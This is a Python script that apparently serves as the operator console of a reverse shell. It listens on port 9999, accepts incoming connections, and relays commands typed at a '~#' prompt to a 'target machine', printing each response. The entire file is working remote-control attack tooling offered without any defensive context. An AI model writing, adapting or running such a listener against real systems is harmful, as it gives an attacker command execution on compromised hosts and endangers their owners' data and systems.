import socket
import sys
import os
import threading
import platform
import subprocess

#clear function
def clear_screen():
    if platform.system() == "Windows":
        subprocess.call("cls", shell=True)
    else:
        subprocess.call("clear", shell=True)

# Create a socket
def socket_create():
    try:
        global host
        global port
        global server
        host = ""
        port = 9999
        server = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {msg}")
        sys.exit()

# Binding the socket with the port
def socket_bind():
    try:
        print(f"Binding the socket to the port: {port}")
        server.bind((host, port))
        server.listen(5)
    except socket.error as msg:
        print(f"Socket binding error: {msg}\nRetrying...")
        socket_bind()

# Accepting the connection
def socket_accept():
    while True:
        conn, addr = server.accept()
        print(f"Connection established with {addr}")
        threading.Thread(target=send_command, args=(conn,)).start()

# Sending command to the target machine
def send_command(conn):
    try:
        while True:
            cmd = input(f"~# ")
            if cmd == "exit":
                conn.send(cmd.encode())
                conn.close()
                server.close()
                sys.exit()
            if len(cmd) > 0:
                if(cmd == "clear"):
                    clear_screen()
                else:
                    conn.send(cmd.encode())
                    client_response = conn.recv(1024).decode("utf-8")
                    print(client_response)
    except socket.error as msg:
        print(f"Connection error: {msg}")
        conn.close()
        server.close()
        # sys.exit()

# Main function
def main():
    socket_create()
    socket_bind()
    socket_accept()

if __name__ == "__main__":
    main()

